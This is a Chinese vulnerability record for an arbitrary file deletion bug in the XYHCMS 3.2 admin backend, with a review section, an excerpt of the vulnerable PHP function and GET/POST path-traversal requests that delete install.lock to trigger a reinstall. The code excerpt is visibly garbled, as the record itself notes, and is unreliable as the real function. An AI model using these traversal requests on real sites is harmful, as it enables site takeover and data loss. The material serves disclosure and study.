---
source: "hatch 补库批 20260928"
product: "XYHCMS3.2"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "XYHCMS 3.2 后台任意文件删除漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：backendDatabasepermission; deletableinstalllock;installerpresentandDBcredentialsforreinstall"
side_effects: "未执行；本文需注意的操作影响：删除install.lock不自动完成重装，还需安装器/数据库条件且可能毁数据"
source_status: "unknown"
id: "vw-3f2b9fde1901d0bce192b060"
entity_id: "ve-3f2b9fde1901d0bce192b060"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：backendDatabasepermission; deletableinstalllock;installerpresentandDBcredentialsforreinstall

- **结论使用边界（1）**：源码重复foreach且外层未闭合，$_ext检查后内容明显丢失，不能将片段当实际完整函数。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：GET示例?s前多空格，Windows反斜线与POST通用路径不同应说明。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **操作与副作用边界（3）**：删除install.lock不自动完成重装，还需安装器/数据库条件且可能毁数据。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（4）**：登录后台明确；缺来源/修复/执行结果。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# XYHCMS 3.2 后台任意文件删除漏洞

一、漏洞简介
------------

二、漏洞影响
------------

XYHCMS 3.2

三、复现过程
------------

### 漏洞分析

`/App/Manage/Controller/DatabaseController.class.php`

    //删除sql文件
    public function delSqlFiles() {
      
        $id = I('id', 0, 'intval');
        $batchFlag = I('get.batchFlag', 0, 'intval');
        //批量删除
        if ($batchFlag) {
            $files = I('key', array());
        } else {
            $files[] = I('sqlfilename', '');
        }
      
        if (empty($files)) {
            $this->error('请选择要删除的sql文件');
        }
        foreach ($files as $file) {
            $_ext = pathinfo($file, PATHINFO_EXTENSION);
            //拼接后直接删除
      
        foreach ($files as $file) {
            unlink($this->getDbPath() . '/' . $file);
        }
        $this->success("已删除：" . implode(",", $files), U('Database/restore'));
      
    }

### 漏洞复现

1.  登录后台

2.  删除安装锁文件

    a.  get方式

    -   `http://www.0-sec.org/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\..\\..\\install/install.lock`

    b.  post方式

    -   `http://www.0-sec.org/xyhai.php?s=/Database/delSqlFiles/batchFlag/1`

        POST数据：`key[]=../../../install/install.lock`

3.  之后访问 `http://www.0-sec.org/install`重装cms
